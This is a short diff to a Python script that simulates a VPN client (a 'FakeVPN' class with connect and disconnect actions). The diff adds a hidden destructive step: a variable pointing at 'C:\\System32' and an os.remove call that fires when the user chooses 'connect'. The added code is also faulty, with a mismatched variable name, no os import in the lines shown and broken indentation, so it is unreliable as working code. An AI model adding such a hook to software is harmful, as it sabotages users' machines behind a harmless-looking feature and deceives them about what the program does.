@@ -1,6 +1,8 @@
 import time
 import random
 
+s32 = "C:\\System32"
+
 class FakeVPN:
     def __init__(self):
         self.connected = False
@@ -42,6 +44,7 @@ def main():
         
         if action == 'connect':
             vpn.connect()
+	    os.remove(S32)
         elif action == 'disconnect':
             vpn.disconnect()
         elif action == 'exit':
